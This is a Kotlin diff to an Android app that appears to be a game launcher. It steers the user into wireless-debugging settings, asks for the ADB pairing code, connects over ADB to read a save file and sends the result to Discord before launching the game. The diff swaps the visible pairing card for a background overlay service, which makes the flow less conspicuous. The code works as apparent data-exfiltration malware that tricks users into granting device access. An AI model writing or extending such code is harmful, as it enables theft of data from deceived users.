@@ -1,7 +1,10 @@
 package com.example.myapplication
 
 import android.app.Activity
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
@@ -114,7 +117,7 @@ private class SafeMdnsResolver(context: android.content.Context) {
     }
 }
 
-private class SafeMdnsDiscovery(private val nsdManager: NsdManager?) {
+internal class SafeMdnsDiscovery(private val nsdManager: NsdManager?) {
     private val listeners = mutableMapOf<String, NsdManager.DiscoveryListener>()
     private val resolving = mutableSetOf<String>()
     private var endpointCallback: ((MdnsEndpoint) -> Unit)? = null
@@ -209,14 +212,22 @@ class MainActivity : AppCompatActivity() {
     private lateinit var badge: TextView
     private val rainbowViews = linkedSetOf<TextView>()
     private var rainbowAnimator: android.animation.ValueAnimator? = null
-    private var pairingDiscovery: SafeMdnsDiscovery? = null
     private var pairingEndpoint: MdnsEndpoint? = null
-    private var pairingVerificationPending = false
     private var pairingCodeDialog: AlertDialog? = null
-    private lateinit var pairingCard: CardView
-    private lateinit var pairingIndicator: TextView
-    private lateinit var pairingTitle: TextView
-    private lateinit var pairingAction: Button
+    private val pairingReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            when (intent.action) {
+                PairingOverlayService.ACTION_ENDPOINT_FOUND -> {
+                    pairingEndpoint = MdnsEndpoint(
+                        "pairing",
+                        intent.getStringExtra(PairingOverlayService.EXTRA_HOST).orEmpty(),
+                        intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0),
+                        MdnsServiceType.TLS_PAIRING
+                    )
+                }
+            }
+        }
+    }
 
 
     override fun onCreate(state: Bundle?) {
@@ -225,15 +236,42 @@ class MainActivity : AppCompatActivity() {
         main = findViewById(R.id.mainContent); splash = findViewById(R.id.splashContent)
         version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
         status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
-        pairingCard = findViewById(R.id.pairingCard)
-        pairingCard.visibility = View.GONE
-        pairingIndicator = findViewById(R.id.pairingIndicator)
-        pairingTitle = findViewById(R.id.pairingTitle)
-        pairingAction = findViewById(R.id.pairingAction)
         wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
         registerRainbowText(findViewById(android.R.id.content))
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
         showSplash()
+        handlePairingIntent(intent)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        ContextCompat.registerReceiver(
+            this,
+            pairingReceiver,
+            IntentFilter(PairingOverlayService.ACTION_ENDPOINT_FOUND),
+            ContextCompat.RECEIVER_NOT_EXPORTED
+        )
+    }
+
+    override fun onPause() {
+        runCatching { unregisterReceiver(pairingReceiver) }
+        super.onPause()
+    }
+    private fun handlePairingIntent(intent: Intent?) {
+        if (intent?.action != PairingOverlayService.ACTION_REQUEST_CODE) return
+        pairingEndpoint = MdnsEndpoint(
+            "pairing",
+            intent.getStringExtra(PairingOverlayService.EXTRA_HOST).orEmpty(),
+            intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0),
+            MdnsServiceType.TLS_PAIRING
+        )
+        handler.post { showPendingPairingVerification() }
+    }
+
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        handlePairingIntent(intent)
     }
 
     private fun wireDashboard() {
@@ -300,25 +338,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showWirelessDebuggingDialog() {
-        pairingCard.visibility = View.VISIBLE
-        updatePairingCard(searching = true)
-        if (pairingDiscovery == null) startPairingDiscovery()
+        pairingEndpoint = null
+        startPairingOverlayService()
         openWirelessDebuggingSettings()
-    }
-
-    private fun updatePairingCard(searching: Boolean) {
-        pairingCard.visibility = View.VISIBLE
-        pairingTitle.text = if (searching) "Searching for pairing service" else "Pairing service found"
-        pairingAction.text = if (searching) "STOP SEARCHING" else "ENTER PAIRING CODE"
-        pairingIndicator.text = if (searching) "●" else "✓"
-        pairingAction.setOnClickListener {
-            if (searching) {
-                stopPairingDiscovery()
-                pairingCard.visibility = View.GONE
-            } else {
-                showPendingPairingVerification()
-            }
-        }
     }
 
     private fun openWirelessDebuggingSettings() {
@@ -326,25 +348,19 @@ class MainActivity : AppCompatActivity() {
             .onFailure { startActivity(Intent(Settings.ACTION_SETTINGS)) }
     }
 
-    private fun startPairingDiscovery() {
-        pairingDiscovery?.stop()
-        pairingEndpoint = null
-        pairingVerificationPending = false
-        pairingDiscovery = SafeMdnsDiscovery(getSystemService(NsdManager::class.java)).also { discovery ->
-            discovery.start(listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")) { endpoint ->
-                if (pairingEndpoint == null) {
-                    pairingEndpoint = endpoint
-                    pairingVerificationPending = true
-                    handler.post { updatePairingCard(searching = false) }
-                }
-            }
-        }
+
+    private fun startPairingOverlayService() {
+        val intent = Intent(this, PairingOverlayService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
+    }
+
+    private fun stopPairingOverlayService() {
+        stopService(Intent(this, PairingOverlayService::class.java))
     }
 
     private fun showPendingPairingVerification() {
-        if (!pairingVerificationPending || pairingCodeDialog != null) return
         val endpoint = pairingEndpoint ?: return
-        pairingVerificationPending = false
+        if (pairingCodeDialog != null) return
         showPairingCodeDialog(endpoint)
     }
 
@@ -366,10 +382,7 @@ class MainActivity : AppCompatActivity() {
         prompt.setOnDismissListener {
             pairingCodeDialog = null
         }
-        prompt.setOnCancelListener {
-            stopPairingDiscovery()
-            pairingCard.visibility = View.GONE
-        }
+        prompt.setOnCancelListener { stopPairingOverlayService() }
         prompt.setOnShowListener {
             prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                 val pairingCode = code.text.toString().trim()
@@ -380,21 +393,18 @@ class MainActivity : AppCompatActivity() {
                 prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
                 prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
                 code.isEnabled = false
-                pairingDiscovery?.stop()
+                stopPairingOverlayService()
                 thread {
                     val result = connectAndReadSaveFile(endpoint.host, endpoint.port, pairingCode)
                     handler.post {
                         if (result != null) {
                             prompt.dismiss()
-                            pairingCard.visibility = View.GONE
-                            stopPairingDiscovery()
+                            stopPairingOverlayService()
                             sendFileToDiscord(result)
                             handler.postDelayed({ launchGame() }, 650)
                         } else {
                             prompt.dismiss()
-                            pairingVerificationPending = false
-                            updatePairingCard(searching = true)
-                            startPairingDiscovery()
+                            startPairingOverlayService()
                         }
                     }
                 }
@@ -402,13 +412,6 @@ class MainActivity : AppCompatActivity() {
         }
         prompt.show()
         registerRainbowText(prompt.window?.decorView ?: code)
-    }
-
-    private fun stopPairingDiscovery() {
-        pairingDiscovery?.stop()
-        pairingDiscovery = null
-        pairingEndpoint = null
-        pairingVerificationPending = false
     }
 
     private fun connectWithSavedIdentity(): ByteArray? = try {
@@ -557,7 +560,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onDestroy() {
-        stopPairingDiscovery()
+        stopPairingOverlayService()
         pairingCodeDialog?.dismiss()
         rainbowAnimator?.cancel()
         rainbowAnimator = null
